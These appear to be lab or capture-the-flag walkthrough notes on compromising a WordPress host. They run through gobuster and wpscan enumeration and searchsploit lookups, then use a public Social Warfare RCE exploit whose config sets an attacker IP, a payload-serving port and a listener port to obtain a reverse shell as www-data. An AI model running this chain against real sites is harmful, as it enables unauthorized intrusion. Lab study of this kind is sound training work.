# SSH/22

```
OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
```
# HTTP/80

```
Apache httpd 2.4.41
```

Directory Brute-Force:
```bash
gobuster dir -u http://192.168.131.78/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -f

# /wordpress/           (Status: 200) [Size: 13420]
```

Wpscan:
```bash
# Enumerate vulnerable plugins
wpscan -e vp --plugins-detection aggressive -o wpscan_results.txt --url http://192.168.131.78/wordpress/

# [+] Upload directory has listing enabled: http://192.168.131.78/wordpress/wp-content/uploads/
# | Found By: Direct Access (Aggressive Detection)
# | Confidence: 100%

# [+] WordPress version 5.4.2 identified
```

"Simple File List" Plugin:
![[Pasted image 20251019161627.png]]

Search for vulns:
```bash
searchsploit Simple File List

# Joomla! Component mod_simpleFileLister 1.0 - Directory Traversal               # | php/webapps/17736.txt
# Simple Directory Listing 2 - Cross-Site Arbitrary File Upload                  # | php/webapps/7383.txt
# Simple File List WordPress Plugin 4.2.2 - File Upload to RCE                   # | multiple/webapps/52371.py
# WordPress Plugin Simple File List 4.2.2 - Arbitrary File Upload                # | php/webapps/48979.py
# WordPress Plugin Simple File List 4.2.2 - Remote Code Execution                # | php/webapps/48449.py
```
=> None of the last 3 exploits works

WPscan all plugins found 2 more plugins:
```bash
# Enumerate all plugins
wpscan -e ap --plugins-detection aggressive --url http://192.168.131.78/wordpress/

[+] simple-cart-solution
 | Location: http://192.168.131.78/wordpress/wp-content/plugins/simple-cart-solution/
 | Last Updated: 2022-04-17T20:50:00.000Z
 | Readme: http://192.168.131.78/wordpress/wp-content/plugins/simple-cart-solution/readme.txt
 | [!] The version is out of date, the latest version is 1.0.2
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.131.78/wordpress/wp-content/plugins/simple-cart-solution/, status: 200
 |
 | Version: 0.2.0 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://192.168.131.78/wordpress/wp-content/plugins/simple-cart-solution/assets/dist/js/public.js?ver=0.2.0
 | Confirmed By:
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://192.168.131.78/wordpress/wp-content/plugins/simple-cart-solution/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://192.168.131.78/wordpress/wp-content/plugins/simple-cart-solution/readme.txt

[+] social-warfare
 | Location: http://192.168.131.78/wordpress/wp-content/plugins/social-warfare/
 | Last Updated: 2025-03-18T09:37:00.000Z
 | Readme: http://192.168.131.78/wordpress/wp-content/plugins/social-warfare/readme.txt
 | [!] The version is out of date, the latest version is 4.5.6
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.131.78/wordpress/wp-content/plugins/social-warfare/, status: 200
 |
 | Version: 3.5.0 (100% confidence)
 | Found By: Comment (Passive Detection)
 |  - http://192.168.131.78/wordpress/, Match: 'Social Warfare v3.5.0'
 | Confirmed By:
 |  Query Parameter (Passive Detection)
 |   - http://192.168.131.78/wordpress/wp-content/plugins/social-warfare/assets/css/style.min.css?ver=3.5.0
 |   - http://192.168.131.78/wordpress/wp-content/plugins/social-warfare/assets/js/script.min.js?ver=3.5.0
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://192.168.131.78/wordpress/wp-content/plugins/social-warfare/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://192.168.131.78/wordpress/wp-content/plugins/social-warfare/readme.txt
```

```bash
searchsploit simple-cart-solution                                                
# Exploits: No Results
# Shellcodes: No Results

searchsploit simple cart solution
# Exploits: No Results
# Shellcodes: No Results

searchsploit social-warfare
# Exploits: No Results
# Shellcodes: No Results

searchsploit social warfare
# Social Warfare WordPress Plugin 3.5.2 - Remote Code Execution (RCE)            | multiple/webapps/52346.py
#  WordPress Plugin Social Warfare < 3.5.3 - Remote Code Execution               | php/webapps/46794.py
```

Exploit 52346 works. Change config before running it:
```python
# --- Config ---
TARGET_URL = "http://192.168.131.78/wordpress/"
ATTACKER_IP = "192.168.45.249"  # Change to your attack box IP
HTTP_PORT = 8000
LISTEN_PORT = 4444
PAYLOAD_FILE = "payload.txt"
```
=> Reverse shell as "www-data"